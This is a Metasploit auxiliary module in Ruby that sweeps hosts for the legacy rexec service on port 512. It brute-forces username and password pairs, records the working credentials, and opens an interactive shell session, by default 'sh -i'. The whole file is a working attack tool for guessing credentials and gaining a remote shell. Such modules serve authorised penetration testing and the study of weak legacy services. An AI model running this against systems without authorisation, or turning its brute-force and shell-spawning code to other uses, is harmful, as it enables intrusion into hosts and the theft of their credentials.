##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::CommandShell
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::ReportSummary

  def initialize
    super(
      'Name' => 'rexec Authentication Scanner',
      'Description' => %q{
        This module will test a range of machines for a Remote EXECution (REXEC)
        service (part of the r-commands suite) and report successful logins,
        optionally attempt to spawn a session.
      },
      'References' => [
        [ 'CVE', '1999-0651' ],
        [ 'CVE', '1999-0502' ] # Weak password
      ],
      'Author' => [ 'jduck' ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(512),
        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ]),
        OptInt.new('STDERR_PORT', [ false, 'The port to listen on for stderr', nil ])
      ]
    )
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting rexec sweep")

    if datastore['ENABLE_STDERR']
      # Bind a local port for the target(s) to connect back to for stderr
      ret = listen_on_random_port(datastore['STDERR_PORT'])
      return :abort if not ret

      sd, stderr_port = ret
    else
      vprint_status("Skipping stderr")
      sd = stderr_port = nil
    end

    # The maximum time for a host is set here
    Timeout.timeout(300) do
      each_user_pass do |user, pass|
        do_login(user, pass, sd, stderr_port)
      end
    end

    sd.close if sd
  end

  def do_login(user, pass, sfd, stderr_port)
    vprint_status("#{target_host}:#{rport} - Attempting rexec with #{user}:#{pass}")

    cmd = datastore['CMD']
    cmd ||= 'sh -i 2>&1'

    # We must connect from a privileged port
    return :abort if !connect

    sock.put("#{stderr_port}\x00#{user}\x00#{pass}\x00#{cmd}\x00")

    if sfd && stderr_port
      stderr_sock = sfd.accept
      add_socket(stderr_sock)
    else
      stderr_sock = nil
    end

    # Get the first byte
    buf = sock.get_once(1) || ''

    # NOTE: We report this here, since we are awfully convinced now that this is really
    # an rexec service
    service_data = {
      address: rhost,
      port: rport,
      # exec (IANA) != rexec (Protocol) --- https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=512
      service_name: 'exec',
      proof: buf,
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    report_service(
      host: service_data[:address],
      port: service_data[:port],
      proto: service_data[:protocol],
      name: service_data[:service_name]
    )

    # The expected response is a null byte
    if buf != "\x00"
      # Get everything else
      buf = sock.get_once(-1) || ''
      vprint_error("Result: #{buf.gsub(/[[:space:]]+/, ' ')}") unless buf.empty?
      # "Where are you" happens with rexecd in netkit-rsh v0.17
      if buf.include?('Where are you?')
        print_error("#{target_host}:#{rport} - The rexecd service could not resolve a hostname for #{Rex::Socket.source_address(target_host)}. Ensure a reverse DNS (PTR) record exists for your attacking host.")
        # Stop, isn't any point going forwards
        return :abort
      end
      # Bad login
      return :failed
    end

    # Should we report a vuln here? rexec allowed w/o password?!
    print_good("#{target_host}:#{rport}, rexec #{user}:#{pass}")
    start_rexec_session(service_data[:address], service_data[:port], user, pass, stderr_sock, service_data)

    return :next_user

  # For debugging only
  # rescue ::Exception
  #  print_error("#{$!}")
  # return :abort
  ensure
    disconnect
  end

  #
  # This is only needed by rexec so it is not in the rservices mixin
  #
  def listen_on_random_port(specific_port = 0)
    stderr_port = nil
    if specific_port > 0
      stderr_port = specific_port
      sd = listen_on_port(stderr_port)
    else
      stderr_port = 1024 + rand(0x10000 - 1024)
      512.times do
        sd = listen_on_port(stderr_port)
        break if sd

        stderr_port = 1024 + rand(0x10000 - 1024)
      end
    end

    if !sd
      print_error("Unable to bind to listener port: #{stderr_port}/TCP")
      return false
    end

    add_socket(sd)
    print_status("Listening on port #{stderr_port}/TCP")
    [ sd, stderr_port ]
  end

  def listen_on_port(stderr_port)
    vprint_status("Trying to listen on port #{stderr_port}/TCP")
    sd = nil
    begin
      sd = Rex::Socket.create_tcp_server('LocalPort' => stderr_port)
    rescue Rex::BindFailed
      # Ignore and try again
    end

    sd
  end

  def start_rexec_session(host, port, user, pass, stderr_sock, service_data)
    credential_data = {
      module_fullname: fullname,
      origin_type: :service,
      username: user,
      # Save a reference to the socket so we don't GC prematurely
      stderr_sock: stderr_sock
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    if datastore['CreateSession']
      start_session(self, "rexec #{user}:#{pass} (#{host}:#{port})", login_data, false, sock)
      # Don't tie the life of this socket to the exploit
      sockets.delete(stderr_sock)
      self.sock = nil
    end
  end
end
